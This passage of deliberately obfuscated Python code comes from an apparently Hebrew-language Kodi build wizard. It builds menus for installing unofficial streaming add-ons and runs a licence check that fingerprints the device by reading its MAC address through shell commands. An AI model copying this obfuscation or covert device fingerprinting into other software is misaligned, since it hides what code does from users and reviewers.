			O00O00000O0O0O0OO =O00O0000O0O0OOO00 #line:1725
		else :#line:1726
			O00O0000O0O0OOO00 =[]#line:1727
			for OOOOOOOOOOO000O00 in O00O00000O0O0O0OO :#line:1728
				OOO00O00O0000OO0O =u"</"+name #line:1729
				O000OO0OOO00OOO00 =O0O00OO00OOOOOOO0 .find (OOOOOOOOOOO000O00 )#line:1731
				O0OO00O0O0O000000 =O0O00OO00OOOOOOO0 .find (OOO00O00O0000OO0O ,O000OO0OOO00OOO00 )#line:1732
				OOO000O00000OOOOO =O0O00OO00OOOOOOO0 .find ("<"+name ,O000OO0OOO00OOO00 +1 )#line:1733
				while OOO000O00000OOOOO <O0OO00O0O0O000000 and OOO000O00000OOOOO !=-1 :#line:1735
					O0O00O000OO00OOO0 =O0O00OO00OOOOOOO0 .find (OOO00O00O0000OO0O ,O0OO00O0O0O000000 +len (OOO00O00O0000OO0O ))#line:1736
					if O0O00O000OO00OOO0 !=-1 :#line:1737
						O0OO00O0O0O000000 =O0O00O000OO00OOO0 #line:1738
					OOO000O00000OOOOO =O0O00OO00OOOOOOO0 .find ("<"+name ,OOO000O00000OOOOO +1 )#line:1739
				if O000OO0OOO00OOO00 ==-1 and O0OO00O0O0O000000 ==-1 :#line:1741
					O0O00O000000O0OOO =u""#line:1742
				elif O000OO0OOO00OOO00 >-1 and O0OO00O0O0O000000 >-1 :#line:1743
					O0O00O000000O0OOO =O0O00OO00OOOOOOO0 [O000OO0OOO00OOO00 +len (OOOOOOOOOOO000O00 ):O0OO00O0O0O000000 ]#line:1744
				elif O0OO00O0O0O000000 >-1 :#line:1745
					O0O00O000000O0OOO =O0O00OO00OOOOOOO0 [:O0OO00O0O0O000000 ]#line:1746
				elif O000OO0OOO00OOO00 >-1 :#line:1747
					O0O00O000000O0OOO =O0O00OO00OOOOOOO0 [O000OO0OOO00OOO00 +len (OOOOOOOOOOO000O00 ):]#line:1748
				if ret :#line:1750
					OOO00O00O0000OO0O =O0O00OO00OOOOOOO0 [O0OO00O0O0O000000 :O0O00OO00OOOOOOO0 .find (">",O0O00OO00OOOOOOO0 .find (OOO00O00O0000OO0O ))+1 ]#line:1751
					O0O00O000000O0OOO =OOOOOOOOOOO000O00 +O0O00O000000O0OOO +OOO00O00O0000OO0O #line:1752
				O0O00OO00OOOOOOO0 =O0O00OO00OOOOOOO0 [O0O00OO00OOOOOOO0 .find (O0O00O000000O0OOO ,O0O00OO00OOOOOOO0 .find (OOOOOOOOOOO000O00 ))+len (O0O00O000000O0OOO ):]#line:1754
				O00O0000O0O0OOO00 .append (O0O00O000000O0OOO )#line:1755
			O00O00000O0O0O0OO =O00O0000O0O0OOO00 #line:1756
		O0OOOOO000OO0OOOO +=O00O00000O0O0O0OO #line:1757
	return O0OOOOO000OO0OOOO #line:1759
def addItem (OO0OOO0O00O000O0O ,OOO0OO00O0000OOOO ,OO0OO0OOOO0000OOO ,OOO00OO00000O0O00 ,O0OO0O0O000O0O0O0 ,description =None ):#line:1761
	if description ==None :description =''#line:1762
	description ='[COLOR white]'+description +'[/COLOR]'#line:1763
	OO0OOO0000OOO0O00 =sys .argv [0 ]+"?url="+urllib .quote_plus (OOO0OO00O0000OOOO )+"&mode="+str (OO0OO0OOOO0000OOO )+"&name="+urllib .quote_plus (OO0OOO0O00O000O0O )+"&iconimage="+urllib .quote_plus (OOO00OO00000O0O00 )+"&fanart="+urllib .quote_plus (O0OO0O0O000O0O0O0 )#line:1764
	O0O00O0000O00OO0O =True #line:1765
	O0O0O0OOO000OO0O0 =xbmcgui .ListItem (OO0OOO0O00O000O0O ,iconImage =OOO00OO00000O0O00 ,thumbnailImage =OOO00OO00000O0O00 )#line:1766
	O0O0O0OOO000OO0O0 .setInfo (type ="Video",infoLabels ={"Title":OO0OOO0O00O000O0O ,"Plot":description })#line:1767
	O0O0O0OOO000OO0O0 .setProperty ("fanart_Image",O0OO0O0O000O0O0O0 )#line:1768
	O0O0O0OOO000OO0O0 .setProperty ("icon_Image",OOO00OO00000O0O00 )#line:1769
	O0O00O0000O00OO0O =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OO0OOO0000OOO0O00 ,listitem =O0O0O0OOO000OO0O0 ,isFolder =False )#line:1770
	return O0O00O0000O00OO0O #line:1771
def get_params ():#line:1773
		O0000OOO00OO0OO0O =[]#line:1774
		O0OO0000OOOO0OOO0 =sys .argv [2 ]#line:1775
		if len (O0OO0000OOOO0OOO0 )>=2 :#line:1776
				O0OO00OOOO000O0OO =sys .argv [2 ]#line:1777
				OO0000OOO00O000OO =O0OO00OOOO000O0OO .replace ('?','')#line:1778
				if (O0OO00OOOO000O0OO [len (O0OO00OOOO000O0OO )-1 ]=='/'):#line:1779
						O0OO00OOOO000O0OO =O0OO00OOOO000O0OO [0 :len (O0OO00OOOO000O0OO )-2 ]#line:1780
				OOO00OO000O00OO00 =OO0000OOO00O000OO .split ('&')#line:1781
				O0000OOO00OO0OO0O ={}#line:1782
				for OO00O0OO00OO00OO0 in range (len (OOO00OO000O00OO00 )):#line:1783
						OOO0OOO00O0O000O0 ={}#line:1784
						OOO0OOO00O0O000O0 =OOO00OO000O00OO00 [OO00O0OO00OO00OO0 ].split ('=')#line:1785
						if (len (OOO0OOO00O0O000O0 ))==2 :#line:1786
								O0000OOO00OO0OO0O [OOO0OOO00O0O000O0 [0 ]]=OOO0OOO00O0O000O0 [1 ]#line:1787
		return O0000OOO00OO0OO0O #line:1789
def decode (OOOO0OOOO0OO0O00O ,OO0O0O00000OO0OOO ):#line:1794
    import base64 #line:1795
    OOOOOOO00O00O0000 =[]#line:1796
    if (len (OOOO0OOOO0OO0O00O ))!=4 :#line:1798
     return 10 #line:1799
    OO0O0O00000OO0OOO =base64 .urlsafe_b64decode (OO0O0O00000OO0OOO )#line:1800
    for OOOOO0O0OOO00O0OO in range (len (OO0O0O00000OO0OOO )):#line:1802
        OO0O00O0O0OOOOOO0 =OOOO0OOOO0OO0O00O [OOOOO0O0OOO00O0OO %len (OOOO0OOOO0OO0O00O )]#line:1803
        O0OO0OO0OO000O00O =chr ((256 +ord (OO0O0O00000OO0OOO [OOOOO0O0OOO00O0OO ])-ord (OO0O00O0O0OOOOOO0 ))%256 )#line:1804
        OOOOOOO00O00O0000 .append (O0OO0OO0OO000O00O )#line:1805
    return "".join (OOOOOOO00O00O0000 )#line:1806
def tmdb_list (O0OO0O00OOO0OO000 ):#line:1807
    O0OOOO000O0000O00 =decode ("7643",O0OO0O00OOO0OO000 )#line:1810
    return int (O0OOOO000O0000O00 )#line:1813
def u_list (OOOO000O000OO0OO0 ):#line:1814
    if xbmc .getCondVisibility ('system.platform.windows')or xbmc .getCondVisibility ('system.platform.android'):#line:1816
        from math import sqrt #line:1817
        OOO000OO0OOO0OOOO =tmdb_list (TMDB_NEW_API )#line:1818
        O00OO00OOO0000OOO =str ((getHwAddr ('eth0'))*OOO000OO0OOO0OOOO )#line:1820
        OO0O0O0OO0OO000OO =int (O00OO00OOO0000OOO [1 ]+O00OO00OOO0000OOO [2 ]+O00OO00OOO0000OOO [5 ]+O00OO00OOO0000OOO [7 ])#line:1821
        O0O0000O0OOOO0O00 =(ADDON .getSetting ("pass"))#line:1823
        OO0OOO0OO000000OO =(str (round (sqrt ((OO0O0O0OO0OO000OO *700 )+50 )+50 ,4 ))[-4 :]).replace ('.','')#line:1828
        if '.'in OO0OOO0OO000000OO :#line:1830
         OO0OOO0OO000000OO =(str (round (sqrt ((OO0O0O0OO0OO000OO *700 )+50 )+50 ,4 ))[-5 :]).replace ('.','')#line:1831
        if O0O0000O0OOOO0O00 ==OO0OOO0OO000000OO :#line:1833
          O000OOO00O0O00OOO =OOOO000O000OO0OO0 #line:1835
        else :#line:1837
           if STARTP2 ()and STARTP ()=='ok':#line:1838
             return OOOO000O000OO0OO0 #line:1841
           O000OOO00O0O00OOO ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:1842
           xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:1843
           sys .exit ()#line:1844
        return O000OOO00O0O00OOO #line:1845
    else :#line:1846
        STARTP ()#line:1847
def disply_hwr ():#line:1851
   try :#line:1852
    O0OO00000O000O00O =tmdb_list (TMDB_NEW_API )#line:1853
    OO0000O0O00OOOOO0 =str ((getHwAddr ('eth0'))*O0OO00000O000O00O )#line:1854
    O0O0O0000O0O0O000 =(OO0000O0O00OOOOO0 [1 ]+OO0000O0O00OOOOO0 [2 ]+OO0000O0O00OOOOO0 [5 ]+OO0000O0O00OOOOO0 [7 ])#line:1861
    O0O00O00OO00O00OO =(ADDON .getSetting ("action"))#line:1862
    wiz .setS ('action',str (O0O0O0000O0O0O000 ))#line:1864
   except :pass #line:1865
def disply_hwr2 ():#line:1866
   try :#line:1867
    O00O00O0O00OO0OO0 =tmdb_list (TMDB_NEW_API )#line:1868
    OOO0O00OOO0000O0O =str ((getHwAddr ('eth0'))*O00O00O0O00OO0OO0 )#line:1870
    O0O0OOO0O0O000OO0 =(OOO0O00OOO0000O0O [1 ]+OOO0O00OOO0000O0O [2 ]+OOO0O00OOO0000O0O [5 ]+OOO0O00OOO0000O0O [7 ])#line:1879
    OOO000000O00OO0O0 =(ADDON .getSetting ("action"))#line:1880
    xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",O0O0OOO0O0O000OO0 )#line:1883
   except :pass #line:1884
def getHwAddr (OOOO0OO00OOO000O0 ):#line:1886
   import subprocess ,time #line:1887
   O0O0O000OOOOOOOOO ='windows'#line:1888
   if xbmc .getCondVisibility ('system.platform.android'):#line:1889
       O0O0O000OOOOOOOOO ='android'#line:1890
   if xbmc .getCondVisibility ('system.platform.android'):#line:1891
     O00O0OO000OO00O00 =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:1892
     O00OOOO0O00OO00O0 =re .compile ('link/ether (.+?) brd').findall (str (O00O0OO000OO00O00 ))#line:1894
     OO000O0O0O00OOO0O =0 #line:1895
     for O00OO00O0OOOOO00O in O00OOOO0O00OO00O0 :#line:1896
      if O00OOOO0O00OO00O0 !='00:00:00:00:00:00':#line:1897
          O00O00O000OOOO00O =O00OO00O0OOOOO00O #line:1898
          OO000O0O0O00OOO0O =OO000O0O0O00OOO0O +int (O00O00O000OOOO00O .replace (':',''),16 )#line:1899
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:1901
       O00OOO0OO00O0OO0O =0 #line:1902
       OO000O0O0O00OOO0O =0 #line:1903
       OOO00OOO0OOO00000 =[]#line:1904
       O0000000000OO0OO0 =os .popen ("getmac").read ()#line:1905
       O0000000000OO0OO0 =O0000000000OO0OO0 .split ("\n")#line:1906
       for O0O0O00O000O00O0O in O0000000000OO0OO0 :#line:1908
            OOOO0OO0000OOO0O0 =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',O0O0O00O000O00O0O ,re .I )#line:1909
            if OOOO0OO0000OOO0O0 :#line:1910
                O00OOOO0O00OO00O0 =OOOO0OO0000OOO0O0 .group ().replace ('-',':')#line:1911
                OOO00OOO0OOO00000 .append (O00OOOO0O00OO00O0 )#line:1912
                OO000O0O0O00OOO0O =OO000O0O0O00OOO0O +int (O00OOOO0O00OO00O0 .replace (':',''),16 )#line:1915
   else :#line:1917
         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:1918
   try :#line:1935
    return OO000O0O0O00OOO0O #line:1936
   except :pass #line:1937
def getpass ():#line:1938
	disply_hwr2 ()#line:1940
def setpass ():#line:1941
    O0O0000OOOOO0O0O0 =xbmcgui .Dialog ()#line:1942
    O0OO00OO0OO0O0O0O =''#line:1943
    O00O00OO0OO0OOOOO =xbmc .Keyboard (O0OO00OO0OO0O0O0O ,'הכנס סיסמה')#line:1945
    O00O00OO0OO0OOOOO .doModal ()#line:1946
    if O00O00OO0OO0OOOOO .isConfirmed ():#line:1947
           O00O00OO0OO0OOOOO =O00O00OO0OO0OOOOO .getText ()#line:1948
    wiz .setS ('pass',str (O00O00OO0OO0OOOOO ))#line:1949
def setuname ():#line:1950
    OO00OOOOO00OO00O0 =''#line:1951
    OOO00O0000O0O00OO =xbmc .Keyboard (OO00OOOOO00OO00O0 ,'הכנס שם משתמש')#line:1952
    OOO00O0000O0O00OO .doModal ()#line:1953
    if OOO00O0000O0O00OO .isConfirmed ():#line:1954
           OO00OOOOO00OO00O0 =OOO00O0000O0O00OO .getText ()#line:1955
           wiz .setS ('user',str (OO00OOOOO00OO00O0 ))#line:1956
def powerkodi ():#line:1957
    os ._exit (1 )#line:1958
def buffer1 ():#line:1960
	O0O0OOOO000O00O00 =xbmc .translatePath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:1961
	OOO00OOO00OOO0O0O =xbmc .getInfoLabel ("System.Memory(total)")#line:1962
	O0O0O0O0O000O00OO =xbmc .getInfoLabel ("System.FreeMemory")#line:1963
	O00O000O000OO0O00 =re .sub ('[^0-9]','',O0O0O0O0O000O00OO )#line:1964
	O00O000O000OO0O00 =int (O00O000O000OO0O00 )/3 #line:1965
	OOO0OO00O0O0OOO00 =O00O000O000OO0O00 *1024 *1024 #line:1966
	try :O0OO0000O000O0O0O =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:1967
	except :O0OO0000O000O0O0O =16 #line:1968
	O00OO00O0OOOOO000 =DIALOG .yesno ('FREE MEMORY: '+str (O0O0O0O0O000O00OO ),'Based on your free Memory your optimal buffersize is: '+str (O00O000O000OO0O00 )+' MB','Choose an Option below...',yeslabel ='Use Optimal',nolabel ='Input a Value')#line:1971
	if O00OO00O0OOOOO000 ==1 :#line:1972
		with open (O0O0OOOO000O00O00 ,"w")as OO0O00OOO00OOO0O0 :#line:1973
			if O0OO0000O000O0O0O >=17 :OOOOO0OOOOOOO0O00 =xml_data_advSettings_New (str (OOO0OO00O0O0OOO00 ))#line:1974
			else :OOOOO0OOOOOOO0O00 =xml_data_advSettings_old (str (OOO0OO00O0O0OOO00 ))#line:1975
			OO0O00OOO00OOO0O0 .write (OOOOO0OOOOOOO0O00 )#line:1977
			DIALOG .ok ('Buffer Size Set to: '+str (OOO0OO00O0O0OOO00 ),'Please restart Kodi for settings to apply.','')#line:1978
	elif O00OO00O0OOOOO000 ==0 :#line:1980
		OOO0OO00O0O0OOO00 =_OO0OOO0OOOOOOO0OO (default =str (OOO0OO00O0O0OOO00 ),heading ="INPUT BUFFER SIZE")#line:1981
		with open (O0O0OOOO000O00O00 ,"w")as OO0O00OOO00OOO0O0 :#line:1982
			if O0OO0000O000O0O0O >=17 :OOOOO0OOOOOOO0O00 =xml_data_advSettings_New (str (OOO0OO00O0O0OOO00 ))#line:1983
			else :OOOOO0OOOOOOO0O00 =xml_data_advSettings_old (str (OOO0OO00O0O0OOO00 ))#line:1984
			OO0O00OOO00OOO0O0 .write (OOOOO0OOOOOOO0O00 )#line:1985
			DIALOG .ok ('Buffer Size Set to: '+str (OOO0OO00O0O0OOO00 ),'Please restart Kodi for settings to apply.','')#line:1986
def xml_data_advSettings_old (OO0O000000OO00OO0 ):#line:1987
	OO0O0O00OOO0O0000 ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%OO0O000000OO00OO0 #line:1997
	return OO0O0O00OOO0O0000 #line:1998
def xml_data_advSettings_New (OO0OO00OOO000OO0O ):#line:2000
	O0O0OO0OO00O0O000 ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>"""%OO0OO00OOO000OO0O #line:2012
	return O0O0OO0OO00O0O000 #line:2013
def write_ADV_SETTINGS_XML (O0000OO0OO00000O0 ):#line:2014
    if not os .path .exists (xml_file ):#line:2015
        with open (xml_file ,"w")as OOOOO0OO00O000O00 :#line:2016
            OOOOO0OO00O000O00 .write (xml_data )#line:2017
def _OO0OOO0OOOOOOO0OO (default ="",heading ="",hidden =False ):#line:2018
    ""#line:2019
    O0000OOO00O00O00O =xbmc .Keyboard (default ,heading ,hidden )#line:2020
    O0000OOO00O00O00O .doModal ()#line:2021
    if (O0000OOO00O00O00O .isConfirmed ()):#line:2022
        return unicode (O0000OOO00O00O00O .getText (),"utf-8")#line:2023
    return default #line:2024
def index ():#line:2026
	addFile ('[COLOR green]קוד חומרה שלך: %s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:2027
	addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2028
	if AUTOUPDATE =='Yes':#line:2029
		if wiz .workingURL (WIZARDFILE )==True :#line:2030
			O00OOOO0O0O0OOOOO =wiz .checkWizard ('version')#line:2031
			if O00OOOO0O0O0OOOOO >VERSION :addFile ('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: '%(ADDONTITLE ,VERSION ,O00OOOO0O0O0OOOOO ),'wizardupdate',themeit =THEME2 )#line:2032
			else :addFile ('%s [v%s] :גירסת ויזארד'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2033
		else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2034
	else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2035
	if len (BUILDNAME )>0 :#line:2036
		O000000O0O000O0OO =wiz .checkBuild (BUILDNAME ,'version')#line:2037
		OO00O0OO00O0000OO ='%s (v%s)'%(BUILDNAME ,BUILDVERSION )#line:2038
		if O000000O0O000O0OO >BUILDVERSION :OO00O0OO00O0000OO ='%s [COLOR red][B][UPDATE v%s][/B][/COLOR]'%(OO00O0OO00O0000OO ,O000000O0O000O0OO )#line:2039
		addDir (OO00O0OO00O0000OO ,'viewbuild',BUILDNAME ,themeit =THEME4 )#line:2041
		try :#line:2043
		     O0OO0OO0OO0OOO00O =wiz .themeCount (BUILDNAME )#line:2044
		except :#line:2045
		   O0OO0OO0OO0OOO00O =False #line:2046
		if not O0OO0OO0OO0OOO00O ==False :#line:2047
			addFile ('None'if BUILDTHEME ==""else BUILDTHEME ,'theme',BUILDNAME ,themeit =THEME5 )#line:2048
	else :addDir ('לא הותקן בילד','builds',themeit =THEME4 )#line:2049
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2052
	addDir ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2053
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2054
	addFile ('אימות חשבונות','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:2058
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:2060
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:2062
def morsetup ():#line:2064
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:2065
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:2066
	addDir ('הגדרת חשבון Rd ו Trakt','rdset',icon =ICONSAVE ,themeit =THEME1 )#line:2067
	addFile ('שלח לוג','logsend',icon =ICONMAINT ,themeit =THEME1 )#line:2068
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:2069
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:2073
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:2074
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:2077
	addFile ('התקנת לקוח טלוויזיה חיה','simpleiptv',icon =ICONMAINT ,themeit =THEME1 )#line:2078
	addFile ('הגדרת ערוצים עידן פלוס בטלוויזיה חיה','simpleidanplus',icon =ICONMAINT ,themeit =THEME1 )#line:2079
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:2080
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:2090
	setView ('files','viewType')#line:2091
def morsetup2 ():#line:2092
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:2093
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:2094
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:2095
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:2096
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:2097
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:2098
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:2099
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:2100
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:2101
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:2102
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:2103
def fastupdate ():#line:2104
		addFile ('עדכון מהיר','testnotify',themeit =THEME1 )#line:2105
def forcefastupdate ():#line:2107
			O00000OO000OO00OO ="[COLOR %s]ברוכים הבאים לעדכון מהיר ידני[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:2108
			wiz .ForceFastUpDate (ADDONTITLE ,O00000OO000OO00OO )#line:2109
def rdsetup ():#line:2113
	addFile ('אימות חשבון RD אוטומטי','setrd2',icon =ICONMAINT ,themeit =THEME1 )#line:2114
	addFile ('אימות חשבון RD ידני','setrd',icon =ICONMAINT ,themeit =THEME1 )#line:2115
	addFile ('אימות חשבון Trakt','traktsync',icon =ICONMAINT ,themeit =THEME1 )#line:2117
	addFile ('ביטול RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:2118
def traktsetup ():#line:2121
	addFile ('[COLOR orange]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2122
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2123
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2124
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2125
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2126
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2127
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2128
	setView ('files','viewType')#line:2129
def setautorealdebrid ():#line:2130
    from resources .libs import real_debrid #line:2131
    O00O0O0OOOO00O0O0 =real_debrid .RealDebridFirst ()#line:2132
    O00O0O0OOOO00O0O0 .auth ()#line:2133
def setrealdebrid ():#line:2135
    O0O0OOO0O00000OO0 =(ADDON .getSetting ("auto_rd"))#line:2136
    if O0O0OOO0O00000OO0 =='false':#line:2137
       ADDON .openSettings ()#line:2138
    else :#line:2139
        from resources .libs import real_debrid #line:2140
        OO0O000O00OOOOOOO =real_debrid .RealDebrid ()#line:2141
        OO0O000O00OOOOOOO .auth ()#line:2142
        rdon ()#line:2145
def resolveurlsetup ():#line:2147
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:2148
def urlresolversetup ():#line:2149
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:2150
def placentasetup ():#line:2152
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:2153
def reptiliasetup ():#line:2154
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:2155
def flixnetsetup ():#line:2156
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:2157
def yodasetup ():#line:2158
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:2159
def numberssetup ():#line:2160
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:2161
def uranussetup ():#line:2162
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:2163
def genesissetup ():#line:2164
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:2165
def net_tools (view =None ):#line:2167
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:2168
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2169
	setView ('files','viewType')#line:2171
def speedMenu ():#line:2172
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')#line:2173
def viewIP ():#line:2174
	OO0O0O0O0OO000OOO =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2188
	O0OO0000OOO0000OO =[];OOO0000OOO0OOO000 =0 #line:2189
	for OOOOO000OO0O0OOOO in OO0O0O0O0OO000OOO :#line:2190
		OO00OOOOO0OOOOO0O =wiz .getInfo (OOOOO000OO0O0OOOO )#line:2191
		O00OOOO00OO00OOO0 =0 #line:2192
		while OO00OOOOO0OOOOO0O =="Busy"and O00OOOO00OO00OOO0 <10 :#line:2193
			OO00OOOOO0OOOOO0O =wiz .getInfo (OOOOO000OO0O0OOOO );O00OOOO00OO00OOO0 +=1 ;wiz .log ("%s sleep %s"%(OOOOO000OO0O0OOOO ,str (O00OOOO00OO00OOO0 )));xbmc .sleep (1000 )#line:2194
		O0OO0000OOO0000OO .append (OO00OOOOO0OOOOO0O )#line:2195
		OOO0000OOO0OOO000 +=1 #line:2196
	OOOO0OOO0OOO00O0O ,OO0O000OO0O0O0OO0 ,OOOO0O000O00OOOOO =getIP ()#line:2197
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO0000OOO0000OO [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2198
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO0OOO0OOO00O0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2199
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O000OO0O0O0OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2200
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO0O000O00OOOOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2201
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO0000OOO0000OO [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2202
	setView ('files','viewType')#line:2203
def buildMenu ():#line:2205
	if USERNAME =='':#line:2206
		ADDON .openSettings ()#line:2207
		sys .exit ()#line:2208
	if PASSWORD =='':#line:2209
		ADDON .openSettings ()#line:2210
	OO0O000O0O000O0O0 =u_list (SPEEDFILE )#line:2211
	(OO0O000O0O000O0O0 )#line:2212
	O0O00OO00000OO00O =(wiz .workingURL (OO0O000O0O000O0O0 ))#line:2213
	(O0O00OO00000OO00O )#line:2214
	O0O00OO00000OO00O =wiz .workingURL (SPEEDFILE )#line:2215
	if not O0O00OO00000OO00O ==True :#line:2216
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2217
		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:2218
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2219
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:2220
